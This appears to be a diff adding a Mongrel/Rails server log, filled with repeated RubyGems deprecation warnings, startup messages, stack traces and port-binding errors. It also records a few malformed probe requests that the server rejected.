+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+Fri Jun 19 02:27:10 -0430 2015: HTTP parse error, malformed request (93.174.93.218): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Fri Jun 19 02:27:10 -0430 2015: REQUEST DATA: "\004\001\000PÀcö60 "
+---
+PARAMS: {}
+---
+Fri Jun 19 02:27:11 -0430 2015: HTTP parse error, malformed request (93.174.93.218): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Fri Jun 19 02:27:11 -0430 2015: REQUEST DATA: "\005\001\000"
+---
+PARAMS: {}
+---
+Fri Jun 19 02:27:13 -0430 2015: HTTP parse error, malformed request (93.174.93.218): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Fri Jun 19 02:27:13 -0430 2015: REQUEST DATA: "\005\001\000"
+---
+PARAMS: {}
+---
+Sat Jun 20 00:59:55 -0430 2015: Read error: #<RuntimeError: No REQUEST PATH>
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:131:in `process_client'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:282:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `each'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+/usr/local/bin/mongrel_rails:23:in `load'
+/usr/local/bin/mongrel_rails:23
+Thu Jun 25 15:09:20 -0430 2015: Read error: #<RuntimeError: No REQUEST PATH>
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:131:in `process_client'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:282:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `each'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+/usr/local/bin/mongrel_rails:23:in `load'
+/usr/local/bin/mongrel_rails:23
+Thu Jun 25 15:09:51 -0430 2015: Read error: #<RuntimeError: No REQUEST PATH>
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:131:in `process_client'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:282:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `each'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+/usr/local/bin/mongrel_rails:23:in `load'
+/usr/local/bin/mongrel_rails:23
+Sat Jun 27 17:22:59 -0430 2015: Read error: #<RuntimeError: No REQUEST PATH>
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:131:in `process_client'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:282:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `each'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+/usr/local/bin/mongrel_rails:23:in `load'
+/usr/local/bin/mongrel_rails:23
+WARNING:  there is already a transaction in progress
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize_without_backlog': Address already in use - bind(2) (Errno::EADDRINUSE)
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `listener'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:99:in `cloaker_'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `call'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+	from /usr/local/bin/mongrel_rails:23:in `load'
+	from /usr/local/bin/mongrel_rails:23
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize_without_backlog': Address already in use - bind(2) (Errno::EADDRINUSE)
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `listener'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:99:in `cloaker_'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `call'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+	from /usr/local/bin/mongrel_rails:23:in `load'
+	from /usr/local/bin/mongrel_rails:23
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
